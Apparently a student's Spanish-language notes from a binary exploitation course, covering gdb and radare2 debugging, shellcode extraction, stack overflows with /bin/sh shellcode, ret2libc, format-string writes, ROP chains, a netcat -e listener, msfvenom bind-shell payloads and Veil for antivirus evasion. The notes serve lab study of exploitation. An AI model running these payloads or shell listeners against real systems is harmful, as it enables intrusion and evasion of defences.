
apt install gcc-multilib
apt install cmake build-essential libboost-dev git
dpkg --add-architecture i386
apt install nasm

# Compilar asm para 32 bits
nasm -f elf32 -o $fuente.obj $fuente.asm && ld -m elf_i386 -o $fuente $fuente.obj

# Para shell (shellcode generado)
nasm -f elf32 -o $fuente.obj $fuente.asm && ld -N -m elf_i386 -o $fuente $fuente.obj

gdb archivo -q

(gdb) info functions
(gdb) r -> run
(gdb) b _start -> breackpoint
(gdb) layout asm
(gdb) layout regs
(gdb) si -> stepi -> siguiente instrucción
(gdb) <enter> -> para repetir instrucción
(gdb) x/x dir_memoria -> x - examinar, x - hexadecimal
(gdb) x/s dir_memoria -> x - examinar, s - string
(gdb) x/d dir_memoria -> x - examinar, d - entero
(gdb) continue -> para terminar la función
(gdb) i r ecx -> ver el valor de un registro

Para cambiar la nomenclatura de gdb:

echo "set disassembly-flavor intel" > ~/.gdbinit



* Registros:
4 de proposito general
todos empiezan con e de extended

eax 
ebx - apuntador 
ecx - registro contador
edx - 

sin la e solo tienen 16 bits, y cada uno tiene parte baja y alta (h y l)


.text
.data
.bss

=============================== dia 2 ===============================

ebp -> pointer base stack
esp -> pointer tope stack
eip ->  instruction pointer

gcc test.c -o testc -m32 -fno-pic -z execstack -mpreferred-stack-boundary=2 -fno-stack-protector


(gdb) info functions
(gdb) info registers
(gdb) disas <funcion>
(gdb) x/x $esp -> checar el estado de la pila

leave -> mov esp, ebp   |                                                                       |
         pop ebp        | ----> regresa al frame anterior                                       |
                                                                                                |---> epílogo
ret -> pop eip |----> regresa a la instrucción donde se quedó antes de llamar a una función     |

(gdb) ni -> salta la siguiente instrucción después de llamar a una función

call -> prologo |-> push ebp -> guarda el marco de quien lo llamó
                |   mov ebp, esp -> generar un nuevo marco de pila


shellcode -> secuencia de bytes que representa instrucciones asm


***************** Nota:
cuando se hace una syscall, aex toma el número de la llamada a la función, y los argumentos los toma de la siguiente forma
e.g.
write(fd, buff, len_buff)
eax -> write -> 4
ebx -> arg1 -> fd
ecx -> arg2 -> buff
edx -> arg3 -> len_buff

objdump -d -M intel salida -> para ver el shellcode

objdump -d -j .text callexit | grep -e '^ ' | tr '[[:space:]]' '\n' | egrep '^[[:alnum:]]{2}$' | xargs | sed 's/ /\\x/g' | sed -e 's/^/\\x/g'     ----->    para filtrar el shellcode 

lea -> load effective address

================================== dia 3 ==================================

rabin2 -l binario -> bibliotecas
rabin2 -I binario -> info archivo
rabin2 -zqq binario -> cadenas

objdump -M intel -d <binario>

radare2 binario
|
|- aa
|- aaa -> para ver todo el binario
|- s main -> posicionarse en esa parte del codigo
|- pd <num lineas> -> para ver que si estamos situados donde queremos
|- vv -> entra a modo visual

test compara 2 registros -> es similar a and, pero no guarda el resultado en el primer registro, activa bandera zero

================================== Dia 4 ==================================

r <<< `python -c "print 'A' * 30 + 'B' * 4 + '\x5d\x55\x55\x56'"`
ctrl+xa -> para salir de los registros

* mecanismo ASLR
/proc/sys/kernel/randomize_va_space -> cambiarlo por un 0 para quitar el mecanismo de protección de binarios para que no aleatorice las direcciones de memoria
echo 0 > /proc/sys/kernel/randomize_va_space -> como root

// Para serial.c
r <<< `python -c "print 'A' * 24 + 'B' * 4 + '\x29\x57\x55\x56'"`

// Para overflow3
r `python -c "print '\x90' * 128 + 'B' * 4 + 'CCCC'"`

r `python -c "print '\x90' * 79 + '\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4a\x41\x41\x41\x41\x4b\x4b\x4b\x4b' + 'B' * 4  + '\x7c\xcf\xff\xff'"`


----------------------- Ubuntu 12.04

http://www.mavetju.org/download/dnstracer-1.8.tar.gz

descomprimirlo, ejecutar el configure, si falla instalar dependencias (build-essential, libncurses5-dev)

modificar linea en Makefile:
CC = gcc -fno-stack-protector -D_FORTIFY_SOURCE=0 -z norelro -z execstack


================================== Dia 5 ==================================


|           buffer            | -> empieza frame de la función
|           ebp               |
|           eip               |
| args de la función a llamar |




ret2libc -> WAX 

https://pastebin.com/bFHeMEXv -> ejemplo
gcc ret2libc.c -m32 -fno-stack-protector -mpreferred-stack-boundary=2 -> lo compilamos así

--> Primero obtienes la dirección de system
(gdb) p &system -> muestra la dir de la función system

---> Después checas el ret de la función "imprime", esto solo para poner un breackpoint
(gdb) disas *imprime -> muestra la función imprime, ponemos un break en donde esta el ret de imprime

---> Probamos igual que los anteriores el número hasta sobreescribir ebp
r `python -c "print 'A' * 128 + 'B' * 4"`

---> Una vez teniendo estos números, lo siguiente será poner la dirección de system como siguientes 4 bytes, recordando que se introduce en little endian
* nos transladamos a la dirección de system para hacer el ataque
r `python -c "print 'A' * 128 + 'B' * 4 + '\xe0\xf3\xe5\xf7'"`

---> Buscamos en memoria la dirección de lib.c 
(gdb) i proc map
---> buscamos la dir de la cadena /bin/sh, ponemos la primera dir de la primera línea y la última dir de la última línea donde aparezca libc
(gdb) find baja, alta, "/bin/sh" -> sintaxis
(gdb) find 0xf7e21000, 0xf7ffe000, "/bin/sh" ----> 0xf7f80551

---> por último hacemos el ataque, poniendo 4 bytes siguientes como basura para el eip y posteriormente la cadena /bin/sh para que esa sea el argumento de la función system
r `python -c "print 'A' * 128 + 'B' * 4 + '\xe0\xf3\xe5\xf7' + 'XXXX' + '\x51\x05\xf8\xf7'"`

---> lo que queda, solo para terminar el programa exitosamente, es cambiar la "basura" por la dir de la función exit
p &exit -> obtenemos esa dirección
r `python -c "print 'A' * 128 + 'B' * 4 + '\xe0\xf3\xe5\xf7' + '\xb0\x21\xe5\xf7' + '\x51\x05\xf8\xf7'"`

---> para ejecutarlo sin gdb
./ret2 `python -c "print 'A' * 128 + 'B' * 4 + '\xe0\xf3\xe5\xf7' + '\xb0\x21\xe5\xf7' + '\x51\x05\xf8\xf7'"`

******* Format string ******

https://pastebin.com/X6GDFkDH
gcc format_string.c -o forstr -m32

python -c "print 'AAAA' + '%x, ' * 6" | ./forstr

---> obtenemos la dirección de la variable "secret"
(gdb) i variables
0x5655702c -> secret

**** Nota: 
printf("%2$, 3, 4, 5) -> $ es el argumento, con el 2 indicamos que imprima el segundo argumento
printf("1234%n", var) -> n indica que guarde en la variable en número de caracteres que tiene antes de él
****
---> checamos que sobreescribe la variable secret, ahora solo sería aumentarle uno
python -c 'print "\x2c\x70\x55\x56%187x%4$n"' | ./forstr

---> como hay problemas, primero debe levantarse un puerto
nc -e ./forstr -lvp 6969

---> posteriormente conectarte a ese puerto
(python -c 'print "\x2c\x70\x55\x56%187x%4$n"'; cat) | nc <ip> <puerto>

************* ROP ************* 

https://pastebin.com/uTLxis7W -> descagar el ftp_server, immunitydebugger, xpISO
https://pastebin.com/KN4238Vi

windows xp serial sp1 -> googlear para el iso xp

ROP -> return oriented programming
gadget -> 
ropchain -> cadena de rops, 

gcc rop.c -o rop_dyn -fno-stack-protector -m32
gcc rop.c -o rop -static -fno-stack-protector -m32

./ROPgadget/ROPgadget.py --ropchain --binary rop -> del estatico


================================== Dia 6 ================================== 


*pedir apuntes*


msfvenom --list payload
msfvenom -p windows/shell_bind_tcp -b '\x00\x0A\x0d' -f python

veilframework -> para evadir soluciones de antivirus


****** off_by_one

https://pastebin.com/xBKbvyx8
gcc -fno-pie -mpreferred-stack-boundary=2 -m32 -zexecstack -ggdb -fno-stack-protector off_by_one.c -o off

